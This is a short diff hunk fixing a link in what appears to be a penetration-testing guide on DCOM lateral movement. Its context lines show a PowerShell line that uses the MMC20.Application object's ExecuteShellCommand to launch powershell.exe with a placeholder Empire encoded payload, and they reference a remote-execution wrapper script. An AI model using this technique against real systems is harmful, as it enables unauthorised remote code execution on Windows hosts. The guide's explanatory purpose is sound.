@@ -1073,7 +1073,7 @@ The below is as per my understanding (I might be wrong), if so, please do correc
   For Empire:
   $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > ","7")
 
- Tanoy has written a simple wrapper/ function `Invoke-MMC20RCE.ps1 <https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1` which might be useful.
+ Tanoy has written a simple wrapper/ function `Invoke-MMC20RCE.ps1 <https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1>`_ which might be useful.
 
 * DCOM via ShellExecute
 
